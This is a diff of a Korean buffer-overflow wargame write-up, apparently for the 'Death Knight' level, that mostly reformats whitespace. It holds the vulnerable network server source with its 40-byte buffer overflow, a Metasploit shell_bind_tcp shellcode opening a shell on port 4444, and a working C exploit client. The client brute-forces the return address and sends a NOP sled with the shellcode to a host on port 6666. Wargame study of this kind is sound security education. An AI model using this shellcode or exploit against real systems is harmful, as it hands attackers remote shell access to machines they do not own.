@@ -564,7 +564,7 @@ dummy02의 시작주소: 0x8048414
 #### 결과
 ```
 aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
-call dummy02     <<dummy02함수 호출된 모습>> 
+call dummy02     // dummy02함수 호출된 모습
 Segmentation fault (core dumped)
 ```
 
@@ -1510,9 +1510,9 @@ if(flag != 1){
   exit(0);
 }
 
-strcpy(buffer,argv[1]);
-printf("%s\n",buffer);
-memset(argc,65,4);
+strcpy(buffer,argv[1]);
+printf("%s\n",buffer);
+memset(argc,65,4);
 ```
 
 ### 문제풀이
@@ -1746,8 +1746,8 @@ memset(addr-3000, 0, 2960);     // buffer윗부분 삭제(LD Preload)
 ```
 old_mmap(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0
 
-x40015000 ioctl(0, TCGETS, {B9600 opost isig icanon echo ...}) = 0 
-read(0, abcdefg "abcdefg\n", 1024) = 8
+x40015000 ioctl(0, TCGETS, {B9600 opost isig icanon echo ...}) = 0
+read(0, abcdefg"abcdefg\n", 1024) = 8
 ```
 
 ```
@@ -1900,8 +1900,8 @@ perl로 하면 뒷자리를 01로 바꾸어 주면 됨
 0x8048a25  <main+353>:   add    %esp,4     
 
 0x8048a28 <main+356>:    jmp    0x8048a60 <main+412>   
-0x8048a2a  <main+358>:   lea    %esi,[%esi]   0
-x8048a30  <main+364>:   mov    %eax,DWORD PTR  [%ebp-48]   
+0x8048a2a  <main+358>:   lea    %esi,[%esi]   
+0x8048a30  <main+364>:   mov    %eax,DWORD PTR  [%ebp-48]   
 0x8048a33  <main+367>:   push   %eax   
 0x8048a34 <main+368>:    call   0x804852c <close>   
 0x8048a39  <main+373>:   add    %esp,4     
@@ -1939,55 +1939,55 @@ x8048a30  <main+364>:   mov    %eax,DWORD PTR  [%ebp-48]
 #include <netinet/in.h>
 #include <sys/socket.h>
 #include <sys/wait.h>
-#include <dumpcode.h>
+#include <dumpcode.h>
 
-main() {
+main() {
   char buffer[40];
   int server_fd, client_fd;
   struct sockaddr_in server_addr;
   struct sockaddr_in client_addr;         
-  int sin_size;         
+  int sin_size;
   
   if((server_fd = socket(2, 1, 0)) == -1){  // (socket(AF_INET, SOCK_STREAM, 0)
     perror("socket");
-    exit(1);         
-  }         
+    exit(1);
+  }
   
-  server_addr.sin_family = AF_INET;         
-  server_addr.sin_port = htons(6666);         server_addr.sin_addr.s_addr = INADDR_ANY;         
-  bzero(&(server_addr.sin_zero), 8);         
+  server_addr.sin_family = AF_INET;
+  server_addr.sin_port = htons(6666);
+  server_addr.sin_addr.s_addr = INADDR_ANY;
+  bzero(&(server_addr.sin_zero), 8);    
   
-  if(bind(server_fd, (struct sockaddr *)&server_addr, sizeof(struct sockaddr)) == -1){                 
-    perror("bind");                 
-    exit(1);         
-  }         
-  
-  if(listen(server_fd, 10) == -1){                 
-    perror("listen");                 
-    exit(1);         
-  }         
-  
-  while(1) {                 
+  if(bind(server_fd, (struct sockaddr *)&server_addr, sizeof(struct sockaddr)) == -1){
+    perror("bind");
+    exit(1);
+  }
+
+  if(listen(server_fd, 10) == -1){
+    perror("listen");
+    exit(1);
+  }
+
+  while(1) {
     sin_size = sizeof(struct sockaddr_in);
     if((client_fd = accept(server_fd, (struct sockaddr *)&client_addr, &sin_size)) == -1){
-      perror("accept");                         
-      continue;                 
-    }                 
-    
-    if (!fork()){                         
-      send(client_fd, "Death Knight : Not even death can save you from me!\n", 52, 0);                         
-      send(client_fd, "You : ", 6, 0);                         
-      recv(client_fd, buffer, 256, 0);                         
-      close(client_fd);                         
-      break;                 
-    }                 
-    
-    close(client_fd);                 
-    while(waitpid(-1,NULL,WNOHANG) > 0);         
-  }
-  close(server_fd); 
-}
+      perror("accept");
+      continue;
+    }
 
+    if (!fork()){
+      send(client_fd, "Death Knight : Not even death can save you from me!\n", 52, 0);
+      send(client_fd, "You : ", 6, 0);
+      recv(client_fd, buffer, 256, 0);
+      close(client_fd);
+      break;
+    }
+
+    close(client_fd);
+    while(waitpid(-1,NULL,WNOHANG) > 0);
+  }
+    close(server_fd);
+}
 ```
 
 ### 문제풀이
@@ -2022,23 +2022,23 @@ ff와 00없는셸코드 제작
 
 #### 사용할 셸코드
 ```
-# linux/x86/shell_bind_tcp - 105 bytes 
-# http://www.metasploit.com 
-# Encoder: x86/shikata_ga_nai 
-# VERBOSE=false, LPORT=4444, RHOST=, PrependFork=false, 
-# PrependSetresuid=false, PrependSetreuid=false, 
-# PrependSetuid=false, PrependSetresgid=false, 
-# PrependSetregid=false, PrependSetgid=false, 
-# PrependChrootBreak=false, AppendExit=false, 
-# InitialAutoRunScript=, AutoRunScript= 
-buf = 
-"\xda\xdb\xbf\x17\x3c\xdf\x0a\xd9\x74\x24\xf4\x5e\x33\xc9" + 
-"\xb1\x14\x83\xc6\x04\x31\x7e\x15\x03\x7e\x15\xf5\xc9\xee" + 
-"\xd1\x0e\xd2\x42\xa5\xa3\x7f\x67\xa0\xa2\x30\x01\x7f\xa4" + 
-"\x6a\x90\x2d\xcc\x8e\x2c\xc3\x50\xe5\x3c\xb2\x38\x70\xdd" + 
-"\x5e\xde\xda\xd3\x1f\x97\x9a\xef\xac\xa3\xac\x96\x1f\x2b" + 
-"\x8f\xe6\xc6\xe6\x90\x94\x5e\x92\xaf\xc2\xad\xe2\x99\x8b" + 
-"\xd5\x8a\x36\x43\x55\x22\x21\xb4\xfb\xdb\xdf\x43\x18\x4b" + 
+# linux/x86/shell_bind_tcp - 105 bytes
+# http://www.metasploit.com
+# Encoder: x86/shikata_ga_nai
+# VERBOSE=false, LPORT=4444, RHOST=, PrependFork=false,
+# PrependSetresuid=false, PrependSetreuid=false,
+# PrependSetuid=false, PrependSetresgid=false,
+# PrependSetregid=false, PrependSetgid=false,
+# PrependChrootBreak=false, AppendExit=false,
+# InitialAutoRunScript=, AutoRunScript=
+buf =
+"\xda\xdb\xbf\x17\x3c\xdf\x0a\xd9\x74\x24\xf4\x5e\x33\xc9" +
+"\xb1\x14\x83\xc6\x04\x31\x7e\x15\x03\x7e\x15\xf5\xc9\xee" +
+"\xd1\x0e\xd2\x42\xa5\xa3\x7f\x67\xa0\xa2\x30\x01\x7f\xa4" +
+"\x6a\x90\x2d\xcc\x8e\x2c\xc3\x50\xe5\x3c\xb2\x38\x70\xdd" +
+"\x5e\xde\xda\xd3\x1f\x97\x9a\xef\xac\xa3\xac\x96\x1f\x2b" +
+"\x8f\xe6\xc6\xe6\x90\x94\x5e\x92\xaf\xc2\xad\xe2\x99\x8b" +
+"\xd5\x8a\x36\x43\x55\x22\x21\xb4\xfb\xdb\xdf\x43\x18\x4b" +
 "\x73\xdd\x3e\xdb\x78\x10\x40"
 ```
 
@@ -2052,23 +2052,30 @@ buf =
 #include <netinet/in.h>
 #include <sys/socket.h>
 
-char shell[]= "\xda\xdb\xbf\x17\x3c\xdf\x0a\xd9\x74\x24\xf4\x5e\x33\xc9" 
-"\xb1\x14\x83\xc6\x04\x31\x7e\x15\x03\x7e\x15\xf5\xc9\xee" "\xd1\x0e\xd2\x42\xa5\xa3\x7f\x67\xa0\xa2\x30\x01\x7f\xa4" "\x6a\x90\x2d\xcc\x8e\x2c\xc3\x50\xe5\x3c\xb2\x38\x70\xdd" "\x5e\xde\xda\xd3\x1f\x97\x9a\xef\xac\xa3\xac\x96\x1f\x2b" "\x8f\xe6\xc6\xe6\x90\x94\x5e\x92\xaf\xc2\xad\xe2\x99\x8b" "\xd5\x8a\x36\x43\x55\x22\x21\xb4\xfb\xdb\xdf\x43\x18\x4b" "\x73\xdd\x3e\xdb\x78\x10\x40";
+char shell[]=
+"\xda\xdb\xbf\x17\x3c\xdf\x0a\xd9\x74\x24\xf4\x5e\x33\xc9"
+"\xb1\x14\x83\xc6\x04\x31\x7e\x15\x03\x7e\x15\xf5\xc9\xee"
+"\xd1\x0e\xd2\x42\xa5\xa3\x7f\x67\xa0\xa2\x30\x01\x7f\xa4"
+"\x6a\x90\x2d\xcc\x8e\x2c\xc3\x50\xe5\x3c\xb2\x38\x70\xdd"
+"\x5e\xde\xda\xd3\x1f\x97\x9a\xef\xac\xa3\xac\x96\x1f\x2b"
+"\x8f\xe6\xc6\xe6\x90\x94\x5e\x92\xaf\xc2\xad\xe2\x99\x8b"
+"\xd5\x8a\x36\x43\x55\x22\x21\xb4\xfb\xdb\xdf\x43\x18\x4b"
+"\x73\xdd\x3e\xdb\x78\x10\x40";
 
-int main(){  
-  int sock=0; 
-  struct sockaddr_in addr; 
+int main(){
+  int sock=0;
+  struct sockaddr_in addr;
   int ret=0xbfffffff;
-  unsigned int num1=0; 
-  unsigned int num2=0; 
-  unsigned int num3=0; 
-  unsigned int num4=0; 
-  unsigned int sum=0; 
-  char data[256]={0,}; 
+    unsigned int num1=0;
+  unsigned int num2=0;
+  unsigned int num3=0;
+  unsigned int num4=0;
+  unsigned int sum=0;
+  char data[256]={0,};
   
-  addr.sin_family=PF_INET; 
-  addr.sin_port=htons(6666); 
-  addr.sin_addr.s_addr=inet_addr("192.168.0.87"); 
+  addr.sin_family=PF_INET;
+  addr.sin_port=htons(6666);
+  addr.sin_addr.s_addr=inet_addr("192.168.0.87");
   bzero( &(addr.sin_zero),8);
   
   memset(data,0x90,256);
@@ -2079,9 +2086,9 @@ int main(){  
     connect(sock, (struct sockaddr *)&addr, sizeof(addr));
   }
   memcpy(data+44,&ret,4);
-  send(sock,&data,sizeof(data),0); 
+  send(sock,&data,sizeof(data),0);
   close(sock);
-  return 0; 
+  return 0;
 }
 ```
 
